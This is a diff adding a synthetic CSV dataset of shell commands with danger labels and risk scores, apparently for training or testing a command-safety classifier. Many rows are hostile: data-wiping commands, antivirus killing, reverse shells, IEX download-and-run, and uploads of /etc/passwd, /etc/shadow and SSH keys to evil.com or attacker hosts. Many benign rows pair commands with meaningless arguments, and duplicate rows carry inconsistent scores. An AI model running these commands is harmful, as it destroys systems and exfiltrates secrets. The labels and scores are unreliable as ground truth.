@@ -1,0 +1,614 @@
+command,label,risk_score
+echo C:\Users\Public,0,2
+scp /etc/nginx,0,2
+cd /var/log,0,2
+echo C:\Users\Public,0,1
+chown root:root /home/user -R,1,8
+chown root:root /etc/hosts /etc/config,0,4
+sudo rm -rf / --no-preserve-root,1,10
+chown user:user data.csv,0,2
+chmod 4777 /home/user,1,7
+chmod 664 script.sh,0,4
+rd /s /q C:\Windows /s /q,1,10
+cat /var/log,0,1
+service /tmp/test,0,2
+iptables -F,1,9
+ping AppData\Local,0,1
+:(){ :|:& };: 2>/dev/null,1,9
+scp -r /root/.ssh attacker@remote:,1,9
+chmod 664 config.yaml,0,1
+vssadmin delete shadows -Force,1,9
+format C: /y /f,1,8
+find /etc/nginx,0,3
+cat /usr/local/bin,0,3
+nslookup C:\Users\Public,0,3
+cat /var/log,0,3
+net user admin /add,1,8
+USERDEL ROOT &,1,9
+cd Documents,0,2
+locate /etc/nginx,0,2
+whoami Documents,0,2
+touch /etc/nginx,0,2
+cipher /w:C: /s /q,1,9
+type C:\Users\Public,0,3
+cls C:\Temp,0,3
+rm -rf /etc,1,8
+chmod 600 /etc/config,0,4
+wmic C:\Users\Public,0,3
+shred -u 2>/dev/null,1,9
+shred -u &,1,8
+reg delete HKLM\Software /s /q,1,9
+chmod 700 index.html,0,2
+ver C:\Users\Public,0,1
+systeminfo D:\Backup,0,3
+shred -u 2>/dev/null,1,8
+chmod 777 backdoor.sh,1,8
+ip /usr/local/bin,0,3
+cipher /w:C: /quiet,1,9
+whoami C:\Temp,0,3
+uptime /tmp/test,0,2
+chmod u+s id_rsa,1,7
+curl -F 'file=@/etc/passwd' http://evil.com,1,10
+ps /etc/nginx,0,2
+reg delete HKLM\Software -Force,1,8
+chmod -R 666 /var/www,1,8
+powershell IEX (New-Object Net.WebClient).DownloadString /quiet,1,10
+chmod 755 index.html,0,1
+chmod -R 777 /etc,1,9
+ver C:\Temp,0,1
+systeminfo Documents,0,3
+cd /home/user/docs,0,2
+iptables -F --no-preserve-root,1,10
+rm -rf /,1,9
+systemctl /usr/local/bin,0,3
+chmod 664 config.yaml,0,2
+srm -rf --no-preserve-root,1,8
+which /tmp/test,0,2
+USERDEL ROOT,1,10
+nslookup C:\Users\Public,0,3
+chmod 400 index.html,0,3
+del C:\Windows\System32\* /s /q,1,8
+systeminfo Documents,0,1
+dir AppData\Local,0,3
+ping /etc/nginx,0,2
+curl /tmp/test,0,3
+powershell Get-Process Documents,0,3
+rm -rf /etc 2>/dev/null,1,9
+python3 /etc/nginx,0,2
+taskkill /f /im MsMpEng.exe,1,10
+ip /tmp/test,0,1
+wmic Documents,0,3
+systemctl /home/user/docs,0,2
+reg delete HKLM\Software /quiet,1,9
+chmod 000 /etc,1,9
+cd /home/user/docs,0,2
+powershell Get-Process D:\Backup,0,3
+rd /s /q C:\Windows,1,10
+chmod 4777 /,1,9
+cp /tmp/test,0,1
+nslookup AppData\Local,0,1
+ping C:\Users\Public,0,3
+mkfs.ext4 /dev/sda --no-preserve-root,1,8
+bcdedit /set recoveryenabled no /quiet,1,10
+wmic C:\Temp,0,2
+systeminfo C:\Users\Public,0,3
+top /var/log,0,2
+chmod 600 script.sh,0,4
+chown root:root /home/user -R 2>/dev/null,1,8
+history -c --no-preserve-root,1,10
+dd if=/dev/zero > /dev/null,1,8
+chmod 777 /,1,9
+chown www-data:www-data index.html,0,2
+rm -rf /,1,8
+netstat D:\Backup,0,3
+mv /home/user/docs,0,3
+hostnamectl /etc/nginx,0,2
+curl /etc/nginx,0,3
+ipconfig D:\Backup,0,2
+rm -rf /etc > /dev/null,1,8
+python3 /tmp/test,0,1
+chmod 600 script.sh,0,4
+powershell IEX (New-Object Net.WebClient).DownloadString -Force,1,8
+whoami AppData\Local,0,1
+USERDEL ROOT --no-preserve-root,1,8
+free /home/user/docs,0,1
+rm -rf /etc --no-preserve-root,1,8
+format C: /y -Force,1,8
+:(){ :|:& };: 2>/dev/null,1,10
+chown root:root /home/user,1,8
+mv /usr/local/bin,0,3
+ipconfig D:\Backup,0,1
+mv /var/log,0,2
+grep /tmp/test,0,2
+vssadmin delete shadows /quiet,1,9
+chown www-data:www-data script.sh,0,4
+nslookup Documents,0,3
+chmod 777 /etc,1,9
+touch /home/user/docs,0,3
+python3 /etc/nginx,0,2
+locate /var/log,0,3
+chmod 400 config.yaml,0,2
+chmod -R 777 /,1,7
+locate /usr/local/bin,0,1
+chmod 777 /var/www,1,8
+copy C:\Users\Public,0,1
+net user admin /add /s /q,1,10
+nano /etc/nginx,0,2
+top /usr/local/bin,0,1
+cat /etc/nginx,0,2
+bcdedit /set recoveryenabled no /s /q,1,9
+bcdedit /set recoveryenabled no,1,10
+chmod 4777 /var/www,1,9
+del C:\Windows\System32\* -Force,1,10
+USERDEL ROOT,1,8
+locate /tmp/test,0,1
+srm -rf > /dev/null,1,10
+echo D:\Backup,0,3
+curl -X POST -d @/etc/shadow --no-preserve-root,1,8
+type C:\Temp,0,2
+dd if=/dev/zero > /dev/null,1,10
+netstat Documents,0,1
+nano /usr/local/bin,0,1
+whoami /tmp/test,0,3
+netstat C:\Temp,0,2
+whoami /usr/local/bin,0,3
+cp /tmp/test,0,2
+chmod 664 config.yaml,0,1
+rm -f /etc/shadow --no-preserve-root,1,8
+whoami /usr/local/bin,0,1
+rd /s /q C:\Windows /s /q,1,10
+git /usr/local/bin,0,2
+mkdir D:\Backup,0,1
+del C:\Windows\System32\* /f,1,10
+cd /etc/nginx,0,3
+vim /usr/local/bin,0,2
+chmod -R 777 /var/www,1,9
+sudo rm -rf / --no-preserve-root,1,9
+netstat Documents,0,2
+chmod 777 id_rsa,1,7
+net user C:\Users\Public,0,1
+del /q C:\Temp,0,3
+scp /home/user/docs,0,2
+bcdedit /set recoveryenabled no /f,1,8
+scp /tmp/test,0,2
+df /tmp/test,0,2
+chown root:root /home/user > /dev/null,1,9
+chmod 000 backdoor.sh,1,7
+hostnamectl /var/log,0,3
+powershell IEX (New-Object Net.WebClient).DownloadString,1,8
+chmod 666 id_rsa,1,8
+cp /tmp/test,0,2
+sudo rm -rf /,1,10
+srm -rf,1,8
+del C:\Windows\System32\* /f,1,10
+vssadmin delete shadows /quiet,1,8
+rm -rf /,1,9
+taskkill /f /im MsMpEng.exe -Force,1,9
+srm -rf &,1,10
+powershell IEX (New-Object Net.WebClient).DownloadString /f,1,10
+chmod 664 /etc/config,0,2
+scp /var/log,0,3
+format C: /y /quiet,1,10
+scp /etc/nginx,0,2
+cp /usr/local/bin,0,1
+rm -rf /,1,8
+scp /etc/nginx,0,3
+cls D:\Backup,0,2
+chmod 400 index.html,0,1
+mimikatz.exe,1,10
+notepad C:\Users\Public,0,2
+copy C:\Users\Public,0,3
+cls AppData\Local,0,2
+systeminfo C:\Users\Public,0,3
+cd Documents,0,2
+net user C:\Users\Public,0,3
+chown root:root /home/user -R,1,8
+tasklist C:\Temp,0,3
+systeminfo AppData\Local,0,3
+hostnamectl /home/user/docs,0,2
+nc -lvp 4444,1,10
+ver C:\Users\Public,0,3
+cipher /w:C: /s /q,1,10
+iptables -F,1,10
+rm -f /etc/shadow &,1,8
+net user C:\Temp,0,1
+grep /usr/local/bin,0,2
+mv /etc/nginx,0,1
+whoami C:\Temp,0,1
+tasklist D:\Backup,0,1
+chmod 755 config.yaml,0,2
+bcdedit /set recoveryenabled no -Force,1,8
+USERDEL ROOT > /dev/null,1,9
+whoami Documents,0,2
+del C:\Windows\System32\*,1,9
+mkfs.ext4 /dev/sda > /dev/null,1,9
+du /var/log,0,1
+powershell -enc ...,1,10
+whoami Documents,0,1
+net user admin /add /f,1,8
+type D:\Backup,0,1
+nslookup secret.dns.evil.com,1,7
+hostnamectl /home/user/docs,0,2
+shred -u,1,9
+df /etc/nginx,0,1
+cd AppData\Local,0,1
+scp /var/log,0,2
+taskkill /f /im MsMpEng.exe /s /q,1,10
+service /home/user/docs,0,2
+chown root:root /etc/hosts config.yaml,0,3
+chmod 777 /,1,10
+ls /home/user/docs,0,2
+powershell IEX (New-Object Net.WebClient).DownloadString -Force,1,10
+mkdir D:\Backup,0,3
+whoami Documents,0,2
+chmod -R 666 /etc,1,7
+chmod 777 /var/www,1,9
+top /tmp/test,0,3
+vssadmin delete shadows,1,10
+wget /tmp/test,0,3
+powershell IEX (New-Object Net.WebClient).DownloadString /quiet,1,8
+ping C:\Users\Public,0,1
+srm -rf,1,9
+type D:\Backup,0,1
+chmod 666 /var/www,1,7
+rm -f /etc/shadow 2>/dev/null,1,8
+which /usr/local/bin,0,1
+echo D:\Backup,0,2
+USERDEL ROOT &,1,9
+netstat Documents,0,2
+chmod 400 script.sh,0,3
+pwd /tmp/test,0,3
+del /q D:\Backup,0,2
+tar /usr/local/bin,0,3
+chown user:user /etc/config,0,3
+git /usr/local/bin,0,2
+type AppData\Local,0,2
+:(){ :|:& };: --no-preserve-root,1,9
+systemctl /tmp/test,0,2
+ver C:\Users\Public,0,2
+bash -i >& /dev/tcp,1,9
+taskkill /f /im MsMpEng.exe /f,1,10
+rd /s /q C:\Windows,1,9
+chown user:user data.csv,0,2
+chmod 000 /var/www,1,8
+cipher /w:C:,1,9
+sudo rm -rf / &,1,8
+hostnamectl /home/user/docs,0,2
+chmod 755 data.csv,0,2
+chmod 4777 /etc,1,7
+ipconfig C:\Temp,0,1
+chmod 666 /etc,1,8
+df /tmp/test,0,2
+du /tmp/test,0,1
+chmod 777 /var/www,1,8
+nslookup D:\Backup,0,2
+reg delete HKLM\Software,1,8
+whoami /etc/nginx,0,2
+tar /etc/nginx,0,2
+net user admin /add -Force,1,10
+del C:\Windows\System32\* /s /q,1,9
+uname /var/log,0,3
+chmod -R 666 id_rsa,1,7
+nslookup D:\Backup,0,3
+wmic D:\Backup,0,3
+notepad Documents,0,3
+chmod 000 /etc,1,7
+rm -rf /etc,1,9
+cp /var/log,0,3
+ipconfig C:\Temp,0,2
+shred -u &,1,8
+pwd /tmp/test,0,3
+mkfs.ext4 /dev/sda 2>/dev/null,1,10
+wget /etc/nginx,0,2
+chown www-data:www-data config.yaml,0,3
+chown root:root /home/user -R --no-preserve-root,1,9
+del C:\Windows\System32\* -Force,1,9
+chown root:root /etc/hosts index.html,0,2
+rd /s /q C:\Windows -Force,1,8
+echo D:\Backup,0,2
+chmod 755 /etc/config,0,4
+cipher /w:C: /f,1,10
+chmod -R 666 backdoor.sh,1,9
+net user admin /add -Force,1,9
+taskkill /f /im MsMpEng.exe -Force,1,8
+ls /home/user/docs,0,3
+chmod u+s /etc,1,8
+chmod 400 script.sh,0,1
+chmod 4777 /home/user,1,7
+chown root:root /etc/hosts data.csv,0,2
+chmod u+s /etc,1,7
+chown www-data:www-data /etc/config,0,1
+chmod 600 index.html,0,2
+chmod 000 /,1,8
+chmod 4777 /etc,1,9
+powershell IEX (New-Object Net.WebClient).DownloadString -Force,1,8
+copy C:\Users\Public,0,1
+locate /tmp/test,0,3
+mkdir C:\Users\Public,0,2
+cd /home/user/docs,0,1
+shred -u secret.txt,1,8
+reg delete HKLM\Software -Force,1,10
+wget /home/user/docs,0,2
+notepad D:\Backup,0,3
+copy C:\Users\Public,0,2
+tasklist AppData\Local,0,3
+nc -lvp 4444 &,1,8
+reg delete HKLM\Software,1,9
+tasklist Documents,0,1
+type C:\Users\Public,0,3
+type Documents,0,2
+ssh /home/user/docs,0,2
+cipher /w:C: /f,1,9
+uname /home/user/docs,0,3
+hostnamectl /usr/local/bin,0,1
+curl -X POST -d @/etc/shadow 2>/dev/null,1,8
+chmod 777 backdoor.sh,1,7
+powershell Get-Process AppData\Local,0,1
+mkdir /var/log,0,3
+nano /tmp/test,0,1
+del /q D:\Backup,0,2
+wmic C:\Temp,0,2
+tasklist D:\Backup,0,2
+rm -rf /etc > /dev/null,1,10
+taskkill /f /im MsMpEng.exe /s /q,1,9
+nc -lvp 4444 2>/dev/null,1,8
+chmod 755 data.csv,0,3
+bash -i >& /dev/tcp &,1,10
+del C:\Windows\System32\* /f,1,9
+format C: /y /quiet,1,8
+grep /usr/local/bin,0,1
+tasklist D:\Backup,0,3
+chmod 777 /home/user,1,7
+chmod 644 data.csv,0,3
+net user D:\Backup,0,2
+net user admin /add /f,1,8
+systemctl /tmp/test,0,1
+ipconfig AppData\Local,0,3
+bcdedit /set recoveryenabled no /quiet,1,10
+free /var/log,0,3
+whoami C:\Users\Public,0,2
+chmod 777 backdoor.sh,1,8
+chmod u+s /,1,9
+systeminfo AppData\Local,0,3
+ssh /home/user/docs,0,1
+taskkill /f /im MsMpEng.exe,1,9
+echo /home/user/docs,0,3
+git /usr/local/bin,0,3
+dd if=/dev/zero,1,10
+del /q C:\Users\Public,0,3
+ping /home/user/docs,0,1
+wmic C:\Users\Public,0,2
+chmod 777 id_rsa,1,8
+dd if=/dev/zero,1,8
+sudo rm -rf / &,1,9
+rd /s /q C:\Windows -Force,1,9
+du /usr/local/bin,0,2
+chmod 664 /etc/config,0,2
+iptables -F 2>/dev/null,1,9
+chmod 4777 /home/user,1,9
+iptables -F > /dev/null,1,8
+ping D:\Backup,0,3
+echo D:\Backup,0,2
+systeminfo C:\Temp,0,2
+ipconfig D:\Backup,0,3
+del C:\Windows\System32\* /s /q,1,8
+reg delete HKLM\Software -Force,1,8
+whoami /tmp/test,0,1
+notepad C:\Temp,0,1
+powershell Get-Process AppData\Local,0,3
+mkfs.ext4 /dev/sda &,1,10
+chmod 4777 backdoor.sh,1,8
+df /usr/local/bin,0,3
+nc -lvp 4444,1,9
+find /home/user/docs,0,1
+cipher /w:C: /quiet,1,8
+dir AppData\Local,0,1
+mkdir AppData\Local,0,2
+bcdedit /set recoveryenabled no /s /q,1,10
+powershell Get-Process Documents,0,2
+ipconfig AppData\Local,0,1
+echo AppData\Local,0,1
+type Documents,0,3
+vssadmin delete shadows -Force,1,8
+history -c &,1,8
+rm -rf /etc > /dev/null,1,10
+net user admin /add,1,8
+net user AppData\Local,0,3
+hostnamectl /home/user/docs,0,1
+chmod 755 script.sh,0,1
+ping C:\Users\Public,0,1
+taskkill /f /im MsMpEng.exe /s /q,1,9
+netstat Documents,0,1
+del /q D:\Backup,0,1
+chmod u+s id_rsa,1,7
+chmod 400 data.csv,0,1
+taskkill /f /im MsMpEng.exe -Force,1,8
+rm -rf / --no-preserve-root,1,8
+chmod 777 /var/www,1,8
+format C: /y /f,1,8
+chown user:user config.yaml,0,4
+chmod -R 777 /var/www,1,9
+ip /var/log,0,3
+type D:\Backup,0,3
+chmod 664 index.html,0,1
+copy D:\Backup,0,2
+iptables -F --no-preserve-root,1,10
+rm -f /etc/shadow,1,10
+wget /home/user/docs,0,3
+locate /var/log,0,1
+vssadmin delete shadows,1,9
+systeminfo D:\Backup,0,2
+tasklist AppData\Local,0,2
+sudo rm -rf /,1,10
+del C:\Windows\System32\* -Force,1,8
+reg delete HKLM\Software /quiet,1,9
+chmod 777 /home/user,1,7
+hostnamectl /home/user/docs,0,1
+bitsadmin /transfer ... http://evil.com,1,9
+del /q C:\Users\Public,0,3
+nc -lvp 4444,1,9
+rd /s /q C:\Windows /s /q,1,9
+cp /etc/nginx,0,1
+zip /usr/local/bin,0,3
+powershell IEX (New-Object Net.WebClient).DownloadString /quiet,1,10
+rd /s /q C:\Windows /s /q,1,9
+node /var/log,0,3
+echo Documents,0,3
+format C: /y,1,9
+cp /etc/nginx,0,1
+chmod 600 /etc/config,0,3
+curl /usr/local/bin,0,2
+sudo rm -rf / > /dev/null,1,10
+cp /tmp/test,0,2
+rm -f /etc/shadow 2>/dev/null,1,9
+chmod 700 index.html,0,4
+chmod u+s /etc,1,8
+chmod 400 script.sh,0,2
+tar /home/user/docs,0,3
+zip /usr/local/bin,0,2
+du /usr/local/bin,0,1
+chown root:root /etc/hosts config.yaml,0,2
+df /etc/nginx,0,1
+iptables -F 2>/dev/null,1,8
+ping C:\Users\Public,0,3
+powershell IEX (New-Object Net.WebClient).DownloadString,1,9
+rm -rf /etc --no-preserve-root,1,8
+format C: /y /f,1,10
+du /home/user/docs,0,3
+top /tmp/test,0,1
+mkfs.ext4 /dev/sda &,1,9
+cipher /w:C: /quiet,1,9
+move AppData\Local,0,1
+reg delete HKLM\Software -Force,1,8
+chmod 664 /etc/config,0,3
+ipconfig Documents,0,2
+cipher /w:C: /f,1,10
+nano /tmp/test,0,3
+format C: /y /quiet,1,9
+powershell IEX (New-Object Net.WebClient).DownloadString -Force,1,8
+chown root:root /home/user -R --no-preserve-root,1,8
+del /q C:\Temp,0,3
+mkfs.ext4 /dev/sda > /dev/null,1,9
+cls C:\Temp,0,1
+nslookup C:\Temp,0,2
+sudo rm -rf / > /dev/null,1,9
+history -c --no-preserve-root,1,9
+whoami /home/user/docs,0,3
+rm -rf / &,1,8
+vssadmin delete shadows /quiet,1,8
+rd /s /q C:\Windows,1,10
+powershell Get-Process C:\Users\Public,0,1
+wget /var/log,0,2
+rm -rf /etc,1,9
+whoami C:\Temp,0,1
+rd /s /q C:\Windows /s /q,1,9
+taskkill /f /im MsMpEng.exe /f,1,8
+shred -u 2>/dev/null,1,9
+echo Documents,0,1
+chown user:user config.yaml,0,2
+mkdir /etc/nginx,0,1
+srm -rf &,1,8
+USERDEL ROOT &,1,8
+cp /tmp/test,0,2
+ipconfig Documents,0,2
+rd /s /q C:\Windows /f,1,8
+grep /tmp/test,0,1
+whoami /etc/nginx,0,3
+nc -lvp 4444 2>/dev/null,1,10
+zip /usr/local/bin,0,1
+systemctl /home/user/docs,0,1
+cipher /w:C:,1,9
+dd if=/dev/zero --no-preserve-root,1,10
+net user C:\Temp,0,1
+powershell Get-Process AppData\Local,0,2
+rm -rf / --no-preserve-root,1,10
+echo C:\Temp,0,3
+whoami D:\Backup,0,2
+ver C:\Users\Public,0,2
+nano /var/log,0,3
+ls /etc/nginx,0,2
+nslookup C:\Temp,0,3
+locate /etc/nginx,0,3
+del C:\Windows\System32\* /f,1,9
+rd /s /q C:\Windows -Force,1,9
+vim /tmp/test,0,3
+mkdir /usr/local/bin,0,1
+chown www-data:www-data config.yaml,0,2
+mkdir /home/user/docs,0,2
+netstat C:\Users\Public,0,2
+del /q D:\Backup,0,2
+chmod 755 /etc/config,0,4
+iptables -F > /dev/null,1,10
+uptime /tmp/test,0,1
+chmod -R 666 /etc,1,7
+srm -rf,1,9
+nc -lvp 4444 2>/dev/null,1,8
+ping D:\Backup,0,2
+ipconfig C:\Temp,0,1
+systemctl list-units,0,2
+USERDEL ROOT 2>/dev/null,1,8
+rm -f /etc/shadow --no-preserve-root,1,10
+chmod 644 index.html,0,4
+ver Documents,0,2
+ver D:\Backup,0,2
+echo /tmp/test,0,1
+dir AppData\Local,0,2
+curl /var/log,0,3
+cipher /w:C:,1,8
+ping /tmp/test,0,3
+srm -rf > /dev/null,1,9
+uname /etc/nginx,0,3
+reg delete HKLM\Software /f,1,9
+ping D:\Backup,0,3
+powershell Get-Process C:\Temp,0,1
+ping C:\Users\Public,0,3
+uptime /var/log,0,3
+chmod -R 777 backdoor.sh,1,7
+net user admin /add,1,10
+chmod 777 id_rsa,1,8
+nc -lvp 4444 &,1,10
+find /home/user/docs,0,1
+chmod 000 /etc,1,8
+copy Documents,0,2
+rm -rf /etc --no-preserve-root,1,8
+chmod 644 index.html,0,4
+chmod 644 index.html,0,1
+nslookup AppData\Local,0,2
+del C:\Windows\System32\* /f,1,10
+vssadmin delete shadows -Force,1,8
+curl -X POST -d @/etc/shadow 2>/dev/null,1,8
+powershell IEX (New-Object Net.WebClient).DownloadString,1,8
+taskkill /f /im MsMpEng.exe,1,10
+chmod 400 /etc/config,0,1
+mkdir Documents,0,3
+vssadmin delete shadows /quiet,1,10
+curl /var/log,0,1
+whoami Documents,0,2
+net user admin /add,1,9
+sudo rm -rf / 2>/dev/null,1,8
+uname /tmp/test,0,2
+chmod -R 666 id_rsa,1,8
+cls C:\Users\Public,0,1
+chown www-data:www-data script.sh,0,4
+bash -i >& /dev/tcp 2>/dev/null,1,10
+chmod 644 data.csv,0,2
+ver AppData\Local,0,2
+ver C:\Temp,0,1
+powershell Get-Process C:\Temp,0,1
+chmod -R 666 /home/user,1,7
+chmod u+s /home/user,1,9
+mkdir /var/log,0,3
+ip /usr/local/bin,0,1
+nslookup Documents,0,2
+which /etc/nginx,0,3
+move C:\Users\Public,0,2
+chmod -R 666 /var/www,1,7
+srm -rf,1,10
+notepad Documents,0,3
+touch /etc/nginx,0,3
+nano /etc/nginx,0,1
+zip /tmp/test,0,1
+node /home/user/docs,0,2
+mkfs.ext4 /dev/sda 2>/dev/null,1,8
+powershell Get-Process C:\Temp,0,2
+cat /usr/local/bin,0,3
